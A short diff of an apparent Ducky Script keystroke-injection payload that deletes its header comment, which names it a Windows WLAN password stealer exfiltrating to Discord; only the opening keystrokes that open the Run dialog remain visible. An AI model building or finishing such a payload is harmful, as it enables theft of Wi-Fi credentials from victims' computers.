@@ -1,14 +1,3 @@
-REM ###################################################################
-REM #                                                                 |
-REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
-REM # Author       : Zenin                                            |
-REM # Description: A script used to stole target WLAN Passwords.      |
-REM # Category     : Credentials                                      |
-REM # Target       : Windows 10-11                                    |
-REM # Version      : 1.0                                              |
-REM #                                                                 |
-REM ###################################################################
-
 DELAY 2000
 GUI r
 DELAY 250
